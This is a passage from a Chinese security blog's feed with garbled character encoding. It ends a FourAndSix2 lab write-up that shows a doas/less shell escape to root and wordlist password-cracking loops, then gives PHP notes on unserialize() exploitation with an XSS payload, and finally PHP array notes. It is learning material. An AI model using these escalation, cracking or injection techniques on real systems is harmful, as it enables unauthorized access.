report bugs in the system.</span><br><span class="line">Before reporting a bug, please try to reproduce it with the latest</span><br><span class="line">version of the code.  With bug reports, please try to ensure that</span><br><span class="line">enough information to reproduce the problem is enclosed, and if a</span><br><span class="line">known fix for it exists, include that as well.</span><br><span class="line"></span><br><span class="line">fourandsix2$</span><br></pre></td></tr></table></figure></p><p>å¦‚ä¸‹æ˜¯é”™è¯¯çš„åšæ³•ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;id_rsa&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br></pre></td></tr></table></figure></p><p>ç™»é™†ä¹‹å</p><p>æ²¡åŠæ³•ç›´æ¥è®¿é—®rootæ–‡ä»¶å¤¹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2$ ls /root/</span><br><span class="line">ls: /root/: Permission denied</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥è¿™æ³¢æ“ä½œå¾ˆä¸æ˜ç™½</p><p>è¾“å…¥<code>doas /usr/bin/less /var/log/authlog</code>ç„¶åæŒ‰vè¿›å…¥ç¼–è¾‘æ¨¡å¼ä¹‹åè¾“å…¥<code>:!/bin/sh</code></p><p><img src="https://i.imgur.com/rU9dNJP.png" alt="four"></p><p>äºæ˜¯å°±ææƒäº†</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>æˆåŠŸäº†</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# cat /root/flag.txt                                                                                                                                             </span><br><span class="line">Nice you hacked all the passwords!</span><br><span class="line"></span><br><span class="line">Not all tools worked well. But with some command magic...:</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here is the flag:</span><br><span class="line">acd043bc3103ed3dd02eee99d5b0ff42</span><br></pre></td></tr></table></figure></p><p>è¡¥å……ææƒçš„è¿‡ç¨‹ï¼šåœ¨<code>/etc/doas.conf</code>æ–‡ä»¶ä¸­æœ‰è¿™äº›å†…å®¹æ‰€ä»¥å¯ä»¥ç”¨<code>doas</code>å‘½ä»¤æŸ¥çœ‹<code>authlod</code>æ–‡ä»¶åŒæ—¶ï¼Œé€šè¿‡ç¼–è¾‘å®ƒï¼Œè¿›å…¥äº†shell</p><p><img src="https://i.imgur.com/iZC9p7A.png" alt="doas"></p><h1>å‚è€ƒ</h1><p><a href="https://www.freebuf.com/articles/web/194783.html" target="_blank" rel="noopener">FourAndSix2.01é¶æœºæ¸—é€</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;fourandsix2é¶æœº&lt;/h2&gt;
&lt;p&gt;ä¸€å¼€æœºå°±å¯ä»¥çœ‹åˆ°IPåœ°å€ä½192.168.41.132&lt;/p&gt;
&lt;p&gt;ç„¶ånmapå¼€å§‹æ‰«æ
&lt;code&gt;nmap -A -n -v -Pn -A 192.168.41.132&lt;/code&gt;
-A Enable OS detect
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="é¶æœº" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="nfs" scheme="https://prontosil.club/tags/nfs/"/>
    
      <category term="nmap" scheme="https://prontosil.club/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>phpååºåˆ—åŒ–ç¬”è®°</title>
    <link href="https://prontosil.club/2019/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/30/phpååºåˆ—åŒ–ç¬”è®°/</id>
    <published>2019-07-30T14:54:28.000Z</published>
    <updated>2019-07-30T14:56:08.639Z</updated>
    
    <content type="html"><![CDATA[<h1>php ååºåˆ—åŒ–</h1><p>å…ˆçœ‹ä¸€ä¸ªæ —å­ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test1 = <span class="keyword">new</span> Test();</span><br><span class="line">$object = serialize($test1);</span><br><span class="line">print_r($object);</span><br></pre></td></tr></table></figure></p><p>åºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„ç»“æœæ˜¯ï¼š<code>O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;}</code></p><p>Oä»£è¡¨æ˜¯å¯¹è±¡ï¼Œ<code>Test</code>æ˜¯ç±»åï¼Œä¹‹åæ˜¯å±æ€§ï¼Œä¸åŒç±»å‹çš„å±æ€§å…¶å®åºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–è¿™ç§æ“ä½œï¼š</p><blockquote><p>serialize() è¿”å›å­—ç¬¦ä¸²ï¼Œæ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤º value çš„å­—èŠ‚æµï¼Œå¯ä»¥å­˜å‚¨äºä»»ä½•åœ°æ–¹ã€‚è¿™æœ‰åˆ©äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚</p></blockquote><p>åŒæ—¶æåˆ°äº†ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼š</p><blockquote><p>å½“åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° __sleep()ã€‚è¿™æ ·å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œã€‚ç±»ä¼¼çš„ï¼Œå½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•°ã€‚</p></blockquote><p><code>__sleep()</code>å’Œ<code>__wakeup()</code>ä¸¤ä¸ªæ–¹æ³•å¾ˆå½¢è±¡åœ°è¯´æ˜äº†ä»€ä¹ˆæ—¶å€™è°ƒç”¨ã€‚</p><p>ç„¶åæˆ‘å°±çŠ¯äº†ä¸€ä¸ªæ–°æ‰‹å¾ˆå¸¸è§çš„é”™è¯¯ï¼š<code>__sleep()</code>æ–¹æ³•å¿…é¡»æ˜¯è¦è¿”å›ä¸€ä¸ª<code>array</code>åœ°<img src="https://i.imgur.com/pulCMhV.png" alt="php3"></p><p>åŸæ¥ã€‚ã€‚<code>__sleep()</code>æ–¹æ³•æ˜¯è¿™æ ·å­è°ƒç”¨çš„å•Š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2>å®é™…è¿½è¸ªä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå‡ºç°ååºåˆ—åŒ–</h2><p>è°ƒè¯•ä»£ç å¦‚ä¸‹:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"this is a test"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$c = unserialize($a);</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨æ€è·¯ï¼šä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>test</code>ç±»å’Œä¸€ä¸ª<code>__destruct()</code>é­”æœ¯æ–¹æ³•ã€‚é‚£å°±æ˜¯æ„é€ è¿™ä¸ªå¯¹è±¡å°†å…¶åºåˆ—åŒ–ä¹‹åä¼ å…¥ï¼Œä¹‹åä¼šè‡ªåŠ¨ååºåˆ—åŒ–åŒæ—¶åœ¨å¯¹è±¡é”€æ¯çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æ‰§è¡Œé­”æœ¯æ–¹æ³•äº†</p><p>æˆ‘ä»¬è¿™æ ·æ¥å†™ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"&lt;script&gt;alert('xss');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">print_r(serialize($object));</span><br></pre></td></tr></table></figure></p><p>çªç„¶è§‰å¾—åºåˆ—åŒ–ä¹Ÿæœ‰ä¸€ç‚¹å˜é‡è¦†ç›–çš„å‘³é“ï¼Œæˆ‘åœ¨å¤–éƒ¨æ„é€ çš„ç±»å®ä¾‹åŒ–çš„å¯¹è±¡è¿›å…¥ä»£ç ä¹‹åè¦†ç›–äº†åŸæ¥çš„å¯¹è±¡ï¼Ÿ</p><p>è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š<code>O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}</code>ç„¶åå°†å…¶ä½œä¸ºå‚æ•°ä¼ å…¥è¿›å»:</p><p><code>http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;}</code></p><p>æ­¤æ—¶æ¥æ”¶åˆ°äº†å‚æ•°ï¼š<img src="https://i.imgur.com/rbponzu.png" alt="php4"><code>$a</code>çš„å€¼ä¸ºï¼š&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot;</p><p>ç»§ç»­å•æ­¥æ­¥å…¥ï¼šè¿™ä¸ªæ—¶å€™å°±ä¼šå»è°ƒç”¨é­”æœ¯æ–¹æ³•äº†<img src="https://i.imgur.com/ozQZZiw.png" alt="php5"></p><p>xssæ¡†æ¡†å°±å¼¹å‡ºæ¥å•¦ã€‚<img src="https://i.imgur.com/W3TNDdl.png" alt="xss3"></p><p>æ¥ä¸‹æ¥ç»§ç»­ç ”ç©¶å‰©ä¸‹çš„é­”æœ¯æ–¹æ³•ï¼šå…ˆçœ‹å‡ ä¸ªç®€å•çš„</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString()"</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"è°ƒç”¨æ–¹æ³•"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"å‚æ•°:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä¸å­˜åœ¨ï¼\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"è°ƒç”¨é™æ€æ–¹æ³•"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"å‚æ•°:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä¸å­˜åœ¨ï¼\n"</span>;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line">test::hello(<span class="string">"nihao"</span>); <span class="comment">//ä¸å®ä¾‹åŒ–å¯¹è±¡ï¼Œæ­¤æ—¶è°ƒç”¨çš„æ˜¯é™æ€æ–¹æ³•</span></span><br><span class="line">$test1-&gt;hello(<span class="string">"nihao"</span>); <span class="comment">//å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">$test2 = serialize($test1);</span><br><span class="line"></span><br><span class="line">$test3 = unserialize($test2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>($test3);</span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨é™æ€æ–¹æ³•hello(:å‚æ•°:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">ä¸å­˜åœ¨ï¼</span><br><span class="line">è°ƒç”¨æ–¹æ³•hello(:å‚æ•°:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">ä¸å­˜åœ¨ï¼</span><br><span class="line">__sleep()</span><br><span class="line">__wakeup()</span><br><span class="line">__toString()</span><br><span class="line">__destruct()</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure></p><p>è¿™å‡ ä¸ªæ–¹æ³•éƒ½è¿˜æŒºå¥½åŒºåˆ†çš„ï¼Œæ¯”è¾ƒéš¾åŒºåˆ†çš„å°±æ˜¯<code>__call()</code>å’Œ<code>__callStatic()</code>æ–¹æ³•äº†ã€‚</p><p>TODO<a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;php ååºåˆ—åŒ–&lt;/h1&gt;
&lt;p&gt;å…ˆçœ‹ä¸€ä¸ªæ —å­ï¼š
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php-manual-note-0</title>
    <link href="https://prontosil.club/2019/07/30/php-manual-note-0/"/>
    <id>https://prontosil.club/2019/07/30/php-manual-note-0/</id>
    <published>2019-07-30T14:52:59.000Z</published>
    <updated>2019-07-30T15:16:36.577Z</updated>
    
    <content type="html"><![CDATA[<h1>php docé˜…è¯»ç¬”è®°0</h1><h2>array</h2><p>æ•°ç»„æ˜¯phpçš„key=&gt;valueæ˜ å°„keyåªèƒ½æ˜¯<code>integer</code>å’Œ<code>string</code>ç±»å‹ï¼Œvalueå¯ä»¥æ˜¯ä»»æ„ç±»å‹</p><p>æ‰€ä»¥keyä¼šæœ‰å¦‚ä¸‹å¼ºåˆ¶è½¬æ¢ï¼š</p><ul><li>åŒ…å«æœ‰åˆæ³•æ•´å‹å€¼çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•´å‹ã€‚ä¾‹å¦‚é”®å &quot;8&quot; å®é™…ä¼šè¢«å‚¨å­˜ä¸º 8ã€‚ä½†æ˜¯ &quot;08&quot; åˆ™ä¸ä¼šå¼ºåˆ¶è½¬æ¢ï¼Œå› ä¸ºå…¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„åè¿›åˆ¶æ•°å€¼ã€‚</li><li>æµ®ç‚¹æ•°ä¹Ÿä¼šè¢«è½¬æ¢ä¸ºæ•´å‹ï¼Œæ„å‘³ç€å…¶å°æ•°éƒ¨åˆ†ä¼šè¢«èˆå»ã€‚ä¾‹å¦‚é”®å 8.7 å®é™…ä¼šè¢«å‚¨å­˜ä¸º 8ã€‚</li><li>å¸ƒå°”å€¼ä¹Ÿä¼šè¢«è½¬æ¢æˆæ•´å‹ã€‚å³é”®å true å®é™…ä¼šè¢«å‚¨å­˜ä¸º 1 è€Œé”®å false ä¼šè¢«å‚¨å­˜ä¸º 0ã€‚</li><li>Null ä¼šè¢«è½¬æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå³é”®å null å®é™…ä¼šè¢«å‚¨å­˜ä¸º &quot;&quot;ã€‚</li><li>æ•°ç»„å’Œå¯¹è±¡ä¸èƒ½è¢«ç”¨ä¸ºé”®åã€‚åšæŒè¿™ä¹ˆåšä¼šå¯¼è‡´è­¦å‘Šï¼šIllegal offset typeã€‚</li></ul><p>æ¯”å¦‚å®˜æ–¹ä¸¾ä¾‹å¦‚ä¸‹ï¼š</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">1</span>    =&gt; <span class="string">"a"</span>,</span><br><span class="line">  <span class="string">"1"</span>  =&gt; <span class="string">"b"</span>,</span><br><span class="line">  <span class="number">1.5</span>  =&gt; <span class="string">"c"</span>,</span><br><span class="line">  <span class="keyword">true</span> =&gt; <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(1) &quot;d&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¼šå¯¼è‡´æ•°ç»„çš„ä¸€éƒ¨åˆ†å€¼è¢«è¦†ç›–æ‰</p><blockquote><p>ä¸Šä¾‹ä¸­æ‰€æœ‰çš„é”®åéƒ½è¢«å¼ºåˆ¶è½¬æ¢ä¸º 1ï¼Œåˆ™æ¯ä¸€ä¸ªæ–°å•å…ƒéƒ½ä¼šè¦†ç›–å‰ä¸€ä¸ªçš„å€¼ï¼Œæœ€åå‰©ä¸‹çš„åªæœ‰ä¸€ä¸ª &quot;d&quot;ã€‚</p></blockquote><p>åŒæ—¶ï¼š</p><blockquote><p>key ä¸ºå¯é€‰é¡¹ã€‚å¦‚æœæœªæŒ‡å®šï¼ŒPHP å°†è‡ªåŠ¨ä½¿ç”¨ä¹‹å‰ç”¨è¿‡çš„æœ€å¤§ integer é”®ååŠ ä¸Š 1 ä½œä¸ºæ–°çš„é”®åã€‚</p></blockquote><p>é‚£å°±ä¼šæœ‰è¿™ç§ç»“æœï¼š</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">"a"</span>,</span><br><span class="line">  <span class="string">"b"</span>,</span><br><span class="line"><span class="number">6</span> =&gt; <span class="string">"c"</span>,</span><br><span class="line">  <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºä¸ºï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(1) &quot;a&quot;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(1) &quot;b&quot;</span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(1) &quot;c&quot;</span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(1) &quot;d&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3>ç¥å¥‡çš„è§£å¼•ç”¨è¯­æ³•</h3><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è§£å¼•ç”¨è¯­æ³•</span></span><br><span class="line"></span><br><span class="line">$a = getArray()[<span class="number">0</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="keyword">list</span>(, $secondelement) = getArray();</span><br><span class="line"></span><br><span class="line">var_dump($secondelement);</span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºä¸ºï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(1)</span><br><span class="line">int(2)</span><br></pre></td></tr></table></figure></p><p><code>list</code>å®šä¹‰ä¸ºï¼šå°†æ•°ç»„ä¸­çš„å€¼èµ‹å€¼ç»™å˜é‡</p><h3>ç”¨[]çš„è¯­æ³•</h3><p>å¦‚æœæœ‰ä¸€ä¸ªæ•°ç»„ <code>$arr = array(5 =&gt; 1, 12 =&gt; 2);</code>é‚£ä¹ˆ<code>$arr[] = 